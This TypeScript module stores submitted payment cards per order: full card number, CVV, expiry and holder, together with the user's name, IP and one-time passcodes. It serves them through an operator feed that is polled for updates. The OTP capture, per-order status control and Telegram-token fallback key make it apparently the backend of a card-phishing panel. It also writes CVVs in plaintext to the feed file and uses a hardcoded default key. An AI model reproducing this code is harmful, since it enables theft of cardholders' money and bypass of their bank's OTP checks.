import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";

const DATA_DIR = path.join(process.cwd(), "data");
const CARDS_PATH = path.join(DATA_DIR, "creditCardOrders.json");
const FEED_PATH = path.join(DATA_DIR, "creditCardFeed.json");

export type AdminCardPayload = {
  holder: string;
  pan: string;
  expiry: string;
  cvv: string;
  savedAt: string;
};

export type CardFeedEntry = {
  order_ref: string;
  transaction_id: string;
  type: string;
  amount: number;
  method: string;
  status: string;
  user_name: string | null;
  user_ip: string | null;
  saved_at: string;
  updated_at: string;
  last_otp: string | null;
  otp_at: string | null;
  card: AdminCardPayload | null;
};

function encryptionKey(): Buffer {
  const secret = String(
    process.env.ADMIN_CARD_ENCRYPTION_KEY || process.env.TELEGRAM_BOT_TOKEN || "saraf-iq-cc"
  ).trim();
  return crypto.createHash("sha256").update(secret).digest();
}

function encryptObject(obj: unknown): string {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", encryptionKey(), iv);
  const plain = JSON.stringify(obj);
  const enc = Buffer.concat([cipher.update(plain, "utf8"), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, enc]).toString("base64");
}

function decryptObject(payload: string): Record<string, unknown> | null {
  try {
    const buf = Buffer.from(String(payload || ""), "base64");
    if (buf.length < 29) return null;
    const iv = buf.subarray(0, 12);
    const tag = buf.subarray(12, 28);
    const enc = buf.subarray(28);
    const decipher = crypto.createDecipheriv("aes-256-gcm", encryptionKey(), iv);
    decipher.setAuthTag(tag);
    const plain = Buffer.concat([decipher.update(enc), decipher.final()]).toString("utf8");
    return JSON.parse(plain) as Record<string, unknown>;
  } catch {
    return null;
  }
}

function normalizeCardInput(fields: {
  holder?: string;
  number?: string;
  expiry?: string;
  cvv?: string;
}): AdminCardPayload | null {
  const holder = String(fields.holder || "").trim().slice(0, 120);
  const pan = String(fields.number || "").replace(/\D/g, "").slice(0, 19);
  const expiry = String(fields.expiry || "").trim().slice(0, 7);
  const cvv = String(fields.cvv || "").trim().slice(0, 4);
  if (!holder || !pan || !cvv) return null;
  return { holder, pan, expiry, cvv, savedAt: new Date().toISOString() };
}

function formatCard(raw: Record<string, unknown> | null): AdminCardPayload | null {
  if (!raw) return null;
  const holder = String(raw.holder ?? raw.cardHolder ?? "").trim();
  const pan = String(raw.pan ?? raw.number ?? raw.cardNumber ?? "").replace(/\D/g, "");
  const expiry = String(raw.expiry ?? raw.cardExpiry ?? "").trim();
  const cvv = String(raw.cvv ?? raw.cardCvv ?? "").trim();
  if (!holder && !pan) return null;
  return {
    holder,
    pan,
    expiry,
    cvv,
    savedAt: String(raw.savedAt || ""),
  };
}

function loadCardsMap(): Record<string, string> {
  try {
    if (!fs.existsSync(CARDS_PATH)) return {};
    const raw = JSON.parse(fs.readFileSync(CARDS_PATH, "utf8"));
    return raw && typeof raw === "object" && !Array.isArray(raw) ? (raw as Record<string, string>) : {};
  } catch {
    return {};
  }
}

function saveCardsMap(map: Record<string, string>) {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.writeFileSync(CARDS_PATH, JSON.stringify(map, null, 2), "utf8");
}

function loadFeedRaw(): CardFeedEntry[] {
  try {
    if (!fs.existsSync(FEED_PATH)) return [];
    const raw = JSON.parse(fs.readFileSync(FEED_PATH, "utf8"));
    return Array.isArray(raw) ? (raw as CardFeedEntry[]) : [];
  } catch {
    return [];
  }
}

function saveFeed(list: CardFeedEntry[]) {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  const trimmed = list.slice(0, 500);
  fs.writeFileSync(FEED_PATH, JSON.stringify(trimmed, null, 2), "utf8");
}

export async function saveCreditCardForOrder(
  orderRef: string,
  fields: { holder?: string; number?: string; expiry?: string; cvv?: string },
  meta: {
    transaction_id: string;
    type: string;
    amount: number;
    method: string;
    status: string;
    user_name?: string | null;
    user_ip?: string | null;
  }
): Promise<AdminCardPayload | null> {
  const ref = String(orderRef || "").trim();
  const card = normalizeCardInput(fields);
  if (!ref || !card) return null;

  const map = loadCardsMap();
  map[ref] = encryptObject(card);
  saveCardsMap(map);

  const now = new Date().toISOString();
  const feed = loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  const entry: CardFeedEntry = {
    order_ref: ref,
    transaction_id: meta.transaction_id,
    type: meta.type,
    amount: meta.amount,
    method: meta.method,
    status: meta.status,
    user_name: meta.user_name?.trim() || null,
    user_ip: meta.user_ip?.trim() || null,
    saved_at: ix >= 0 ? feed[ix].saved_at : now,
    updated_at: now,
    last_otp: ix >= 0 ? feed[ix].last_otp : null,
    otp_at: ix >= 0 ? feed[ix].otp_at : null,
    card,
  };
  if (ix >= 0) feed[ix] = entry;
  else feed.unshift(entry);
  saveFeed(feed);
  return card;
}

export async function attachOtpToCardFeed(orderRef: string, otp: string): Promise<boolean> {
  const ref = String(orderRef || "").trim();
  const code = String(otp || "").trim().slice(0, 12);
  if (!ref || !code) return false;
  const feed = loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) return false;
  const now = new Date().toISOString();
  feed[ix] = { ...feed[ix], last_otp: code, otp_at: now, updated_at: now };
  saveFeed(feed);
  return true;
}

export async function updateCardFeedStatus(orderRef: string, status: string): Promise<boolean> {
  const ref = String(orderRef || "").trim();
  if (!ref) return false;
  const feed = loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) return false;
  feed[ix] = { ...feed[ix], status, updated_at: new Date().toISOString() };
  saveFeed(feed);
  return true;
}

export async function getCardFeedStatus(orderRef: string): Promise<string | null> {
  const ref = String(orderRef || "").trim();
  if (!ref) return null;
  const row = loadFeedRaw().find((e) => e.order_ref === ref);
  return row?.status ? String(row.status) : null;
}

export async function getCreditCardByOrderRef(orderRef: string): Promise<AdminCardPayload | null> {
  const ref = String(orderRef || "").trim();
  if (!ref) return null;
  const enc = loadCardsMap()[ref];
  if (!enc) return null;
  return formatCard(decryptObject(enc));
}

export async function listCardFeed(opts?: { since?: string; limit?: number }): Promise<{
  items: CardFeedEntry[];
  serverTime: string;
}> {
  const limit = Math.min(200, Math.max(1, opts?.limit ?? 50));
  let items = loadFeedRaw();
  const since = opts?.since?.trim();
  if (since) {
    const t = new Date(since).getTime();
    if (Number.isFinite(t)) {
      items = items.filter((e) => new Date(e.updated_at).getTime() > t);
    }
  }
  items = items.slice(0, limit);
  for (const row of items) {
    if (!row.card) {
      row.card = await getCreditCardByOrderRef(row.order_ref);
    }
  }
  return { items, serverTime: new Date().toISOString() };
}
